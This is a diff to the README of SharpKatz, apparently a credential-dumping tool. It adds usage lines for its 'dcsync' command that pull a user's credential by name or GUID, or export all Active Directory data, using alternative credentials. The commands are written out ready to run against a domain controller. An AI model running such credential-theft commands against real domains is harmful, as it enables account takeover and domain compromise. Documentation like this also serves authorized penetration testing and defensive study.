@@ -71,6 +71,15 @@ Dump user credential by GUID <br>
 ```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
 Export the entire dataset from AD to a file created in the current user's temp forder<br>
 <br>
+```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
+Dump user credential by username using alternative credentials<br>
+<br>
+```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
+Dump user credential by GUID using alternative credentials<br>
+<br>
+```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
+Export the entire dataset from AD to a file created in the current user's temp forder using alternative credentials<br>
+<br>
 
 ### Zerologon
 
